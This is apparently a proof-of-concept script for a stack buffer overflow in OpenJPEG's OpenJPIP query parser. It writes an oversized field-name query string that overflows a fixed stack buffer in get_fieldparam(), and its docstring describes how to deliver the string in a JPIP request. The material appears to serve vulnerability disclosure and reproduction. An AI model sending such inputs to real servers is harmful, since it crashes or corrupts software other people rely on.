#!/usr/bin/env python3
"""
PoC generator for: stack-buffer-overflow in OpenJPEG OpenJPIP
get_fieldparam() (src/lib/openjpip/query_parser.c)

Writes a JPIP QUERY_STRING value whose field NAME (the text before the
first '=') is longer than MAX_LENOFFIELDNAME (10, including the NUL
terminator budget of 9 usable chars) so that get_fieldparam()'s unbounded
strncpy() into a fixed `char fieldname[MAX_LENOFFIELDNAME]` stack buffer
(query_parser.c, parse_query()) overflows.

Output: query_string.txt - a single line containing the malicious
QUERY_STRING value, exactly as it would appear in a JPIP HTTP request
(e.g. "GET /target.jp2?<content> HTTP/1.1") or as argv[1] to a harness
that calls the real parse_query()/parse_querystring() entry point.
"""

FIELDNAME_LEN = 20   # > MAX_LENOFFIELDNAME(10); default field value is short & valid
QUERY_STRING = ("a" * FIELDNAME_LEN) + "=x"

if __name__ == "__main__":
    with open("query_string.txt", "w") as f:
        f.write(QUERY_STRING)
    print(f"wrote query_string.txt: {QUERY_STRING!r} ({len(QUERY_STRING)} bytes)")
